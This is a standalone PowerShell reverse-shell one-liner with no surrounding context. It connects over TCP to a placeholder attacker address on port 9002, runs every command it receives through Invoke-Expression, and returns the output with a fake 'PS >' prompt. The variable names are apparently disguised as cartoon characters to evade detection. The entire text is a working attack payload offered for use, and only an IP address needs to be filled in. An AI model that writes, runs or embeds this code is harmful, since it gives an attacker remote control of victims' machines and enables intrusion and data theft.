$marshall = New-Object System.Net.Sockets.TCPClient('<attacker-ip>',9002);$chase = $marshall.GetStream();[byte[]]$sky = 0..65535|%{0};while(($i = $chase.Read($sky, 0, $sky.Length)) -ne 0){;$rubble = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($sky,0, $i);$zooma = (iex $rubble 2>&1 | Out-String );$rocky  = $zooma + 'PS ' + '> ';$rider = ([text.encoding]::ASCII).GetBytes($rocky);$chase.Write($rider,0,$rider.Length);$chase.Flush()};$marshall.Close()